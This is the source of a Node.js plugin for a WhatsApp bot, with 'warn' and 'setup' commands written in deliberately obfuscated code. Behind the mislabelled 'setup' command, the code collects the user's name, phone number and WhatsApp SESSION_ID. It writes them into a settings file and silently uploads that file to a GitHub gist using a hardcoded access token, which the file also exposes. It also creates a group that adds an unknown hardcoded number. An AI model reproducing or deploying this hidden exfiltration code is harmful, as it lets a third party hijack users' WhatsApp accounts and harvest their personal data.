const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
function _0x3a7d(_0x353e6c,_0x18f5a6){const _0x3b8453=_0x3b84();return _0x3a7d=function(_0x3a7d21,_0x2a6ffc){_0x3a7d21=_0x3a7d21-0x17f;let _0x3e9b7e=_0x3b8453[_0x3a7d21];return _0x3e9b7e;},_0x3a7d(_0x353e6c,_0x18f5a6);}function _0x3b84(){const _0x349ee4=['1LZWjiJ','3692794fAhWfW','333BKmYDY','8321346ZxjLIX','5yjYLwp','14344110wnDozh','371170YhKUUg','12431209ZNKQui','8nWQcbY','7141304PfJqJW','1262586jJZrKF'];_0x3b84=function(){return _0x349ee4;};return _0x3b84();}(function(_0x1c4a33,_0x5e6972){const _0x257e58=_0x3a7d,_0x29b449=_0x1c4a33();while(!![]){try{const _0x3282f6=-parseInt(_0x257e58(0x17f))/0x1*(-parseInt(_0x257e58(0x180))/0x2)+parseInt(_0x257e58(0x189))/0x3+-parseInt(_0x257e58(0x188))/0x4*(parseInt(_0x257e58(0x183))/0x5)+-parseInt(_0x257e58(0x182))/0x6+-parseInt(_0x257e58(0x186))/0x7*(-parseInt(_0x257e58(0x187))/0x8)+parseInt(_0x257e58(0x181))/0x9*(parseInt(_0x257e58(0x185))/0xa)+-parseInt(_0x257e58(0x184))/0xb;if(_0x3282f6===_0x5e6972)break;else _0x29b449['push'](_0x29b449['shift']());}catch(_0x5172dd){_0x29b449['push'](_0x29b449['shift']());}}}(_0x3b84,0xe58d8));const {Octokit}=require('@octokit/rest'),octokit=new Octokit({'auth':'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'});
const relconfig = require('../config')

//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================




//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})



command({
  pattern: "setup",
  fromMe: true,
  desc: "turn off",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
function _0x3e18(_0x26c97d,_0x194cf4){const _0x572242=_0x5722();return _0x3e18=function(_0x3e189e,_0x4d45f1){_0x3e189e=_0x3e189e-0x174;let _0x4f1ae7=_0x572242[_0x3e189e];return _0x4f1ae7;},_0x3e18(_0x26c97d,_0x194cf4);}const _0xe2c396=_0x3e18;function _0x5722(){const _0x4d44bf=['readFileSync','FONT_STYLE','parse','reset','./database/settings.json','name','_You\x20Are\x20Already\x20a\x20Family\x20Member_','MESSAGE_MEM','359889999996@s.whatsapp.net','RMBG_KEY','AUTHOR','WELCOME_MSG','@g.us','HANDLER','.json','Storage','WORK_TYPE','119VoqMbx','config','groupCreate','BRANCH','ANTILINK_ACTION','creds','PACKNAME','FOOTER','GOODBYE_MSG','ANTILINK','This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!','43062XFzyAz','client','LANGUAGE','UserId','isGroup','STORAGE_JID','@s.whatsapp.net','MODE','./media/AAA.jpg','log','50436ZFEtpd','updateProfilePicture','utf-8','1477413PDvQSF','LANG','24xaWKJp','799634QioZAa','pushName','sendMessage','Cloud\x20DB\x20Update','OWNER_NAME','toString','split','INTERNAL_MENU','THEME','gists','BOT_NAME','10578130AyHQWv','ALIVE','296569BLssUC','1065762emOPvF','includes','30HcVuLu','reply','a216db893ba4f4a18d4f1476bfc1bb4d','LOGS'];_0x5722=function(){return _0x4d44bf;};return _0x5722();}(function(_0x1d6c53,_0x586764){const _0x134f32=_0x3e18,_0x191cef=_0x1d6c53();while(!![]){try{const _0x57838d=-parseInt(_0x134f32(0x18f))/0x1+parseInt(_0x134f32(0x182))/0x2+-parseInt(_0x134f32(0x17f))/0x3+parseInt(_0x134f32(0x17c))/0x4*(parseInt(_0x134f32(0x192))/0x5)+parseInt(_0x134f32(0x1b2))/0x6*(-parseInt(_0x134f32(0x1a7))/0x7)+parseInt(_0x134f32(0x181))/0x8*(-parseInt(_0x134f32(0x190))/0x9)+parseInt(_0x134f32(0x18d))/0xa;if(_0x57838d===_0x586764)break;else _0x191cef['push'](_0x191cef['shift']());}catch(_0x502f24){_0x191cef['push'](_0x191cef['shift']());}}}(_0x5722,0x412e5));if(message[_0xe2c396(0x176)])return;setTimeout(()=>{const _0x5d3f2e=_0xe2c396;let _0x3c8bda=JSON[_0x5d3f2e(0x198)](fs[_0x5d3f2e(0x196)]('./database/settings.json')),_0x34aff1=_0x3c8bda[_0x5d3f2e(0x1a8)][_0x5d3f2e(0x177)],_0x321319=_0x34aff1['toString']()['includes'](_0x5d3f2e(0x1a2));if(!_0x321319)readFile(path,async(_0x17f4f4,_0x3d4a8b)=>{const _0x337141=_0x5d3f2e;if(_0x17f4f4){console[_0x337141(0x17b)](_0x17f4f4);return;}const _0x5d7203=JSON[_0x337141(0x198)](_0x3d4a8b);let _0x3fa37c=await message[_0x337141(0x1b3)][_0x337141(0x1a9)](_0x337141(0x1a5),[_0x337141(0x19e)]);await message[_0x337141(0x1b3)][_0x337141(0x184)](_0x3fa37c['id'],{'text':_0x337141(0x1b1)});let _0x1eb648=await _0x3fa37c['id'];_0x5d7203[_0x337141(0x1a8)][_0x337141(0x177)]=_0x1eb648,writeFile(path,JSON['stringify'](_0x5d7203,null,0x2),async _0xd70bfc=>{const _0xa664c0=_0x337141;if(_0xd70bfc){message[_0xa664c0(0x193)]('Failed\x20to\x20write\x20updated\x20data\x20to\x20file');return;}await message[_0xa664c0(0x1b3)][_0xa664c0(0x17d)](_0x3fa37c['id'],fs['readFileSync'](_0xa664c0(0x17a)));});});else return;setTimeout(async()=>{const _0x196e66=_0x5d3f2e;let _0x442858=require('../session.json'),_0x4dbbf6=await _0x442858['creds']['me']['id'][_0x196e66(0x188)](':')[0x0],_0x15aea0=await _0x442858[_0x196e66(0x1ac)]['me']['id'][_0x196e66(0x188)]('@')[0x1],_0x4b23f5=_0x4dbbf6+'@'+_0x15aea0,_0x548864=_0x4b23f5+_0x196e66(0x1a4);const _0x42ad81=fs['readFileSync'](_0x196e66(0x19a),_0x196e66(0x17e));await octokit['rest'][_0x196e66(0x18b)]['update']({'gist_id':_0x196e66(0x194),'description':_0x196e66(0x185),'files':{[_0x548864]:{'content':_0x42ad81}}})['then'](await console[_0x196e66(0x17b)]('Done\x20Creating\x20New\x20Db')),setTimeout(()=>{const _0x3986b8=_0x196e66;return process['send'](_0x3986b8(0x199));},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0xb774e0,_0x306530)=>{const _0x157e3b=_0xe2c396;if(_0xb774e0){console[_0x157e3b(0x17b)](_0xb774e0);return;}const _0x2067fb=JSON['parse'](_0x306530);let _0x5d7f5c=_0x2067fb[_0x157e3b(0x175)][_0x157e3b(0x187)]()[_0x157e3b(0x191)](_0x157e3b(0x178));if(_0x5d7f5c)return message[_0x157e3b(0x193)](_0x157e3b(0x19c));let _0x4ef4f6=message[_0x157e3b(0x183)],_0x351890=message['user'],_0x1faf41=message['jid'][_0x157e3b(0x187)]()[_0x157e3b(0x188)]('@')[0x0];_0x2067fb[_0x157e3b(0x19b)]=_0x4ef4f6,_0x2067fb[_0x157e3b(0x175)]=_0x351890,_0x2067fb['phone_num']=_0x1faf41,_0x2067fb[_0x157e3b(0x1a8)][_0x157e3b(0x1a3)]=relconfig['HANDLER'],_0x2067fb[_0x157e3b(0x1a8)]['WORK_TYPE']=relconfig[_0x157e3b(0x1a6)],_0x2067fb['config'][_0x157e3b(0x18c)]=relconfig[_0x157e3b(0x18c)],_0x2067fb[_0x157e3b(0x1a8)][_0x157e3b(0x186)]=relconfig[_0x157e3b(0x186)],_0x2067fb['config']['SUDO']=relconfig['SUDO'],_0x2067fb[_0x157e3b(0x1a8)][_0x157e3b(0x1a0)]=relconfig['AUTHOR'],_0x2067fb[_0x157e3b(0x1a8)]['PACKNAME']=relconfig[_0x157e3b(0x1ad)],_0x2067fb[_0x157e3b(0x1a8)][_0x157e3b(0x19f)]=relconfig[_0x157e3b(0x19f)],_0x2067fb[_0x157e3b(0x1a8)][_0x157e3b(0x180)]=relconfig[_0x157e3b(0x180)],_0x2067fb[_0x157e3b(0x1a8)][_0x157e3b(0x1ab)]=relconfig[_0x157e3b(0x1ab)],_0x2067fb[_0x157e3b(0x1a8)][_0x157e3b(0x1b0)]=relconfig[_0x157e3b(0x1b0)],_0x2067fb['config'][_0x157e3b(0x1ae)]=relconfig['FOOTER'],_0x2067fb[_0x157e3b(0x1a8)][_0x157e3b(0x18a)]=relconfig['THEME'],_0x2067fb[_0x157e3b(0x1a8)][_0x157e3b(0x197)]=relconfig[_0x157e3b(0x197)],_0x2067fb['config'][_0x157e3b(0x174)]=relconfig[_0x157e3b(0x174)],_0x2067fb[_0x157e3b(0x1a8)]['INTERNAL_MENU']=relconfig[_0x157e3b(0x189)],_0x2067fb[_0x157e3b(0x1a8)][_0x157e3b(0x179)]=relconfig[_0x157e3b(0x179)],_0x2067fb[_0x157e3b(0x1a8)]['STORAGE_JID'],_0x2067fb['config']['DB_URL'],_0x2067fb['config']['SESSION_ID']=relconfig['SESSION_ID'],_0x2067fb[_0x157e3b(0x1a8)]['LOGS']=relconfig[_0x157e3b(0x195)],_0x2067fb[_0x157e3b(0x1a8)][_0x157e3b(0x1aa)]=relconfig[_0x157e3b(0x1aa)],_0x2067fb[_0x157e3b(0x1a8)]['B1']=relconfig['B1'],_0x2067fb[_0x157e3b(0x1a8)]['B2']=relconfig['B2'],_0x2067fb[_0x157e3b(0x1a8)]['B3']=relconfig['B3'],_0x2067fb[_0x157e3b(0x1a8)]['B4']=relconfig['B4'],_0x2067fb[_0x157e3b(0x1a8)]['B5']=relconfig['B5'],_0x2067fb[_0x157e3b(0x19d)][_0x157e3b(0x1af)]=relconfig[_0x157e3b(0x1af)],_0x2067fb['MESSAGE_MEM']['WELCOME_MSG']=relconfig[_0x157e3b(0x1a1)],_0x2067fb[_0x157e3b(0x19d)][_0x157e3b(0x18e)]=relconfig[_0x157e3b(0x18e)],writeFile(path,JSON['stringify'](_0x2067fb,null,0x2),_0x533b23=>{const _0x14389b=_0x157e3b;if(_0x533b23){message['reply']('Failed\x20to\x20write\x20updated\x20data\x20to\x20file');return;}message[_0x14389b(0x193)]('_Registered\x20Successfully_');});});
})

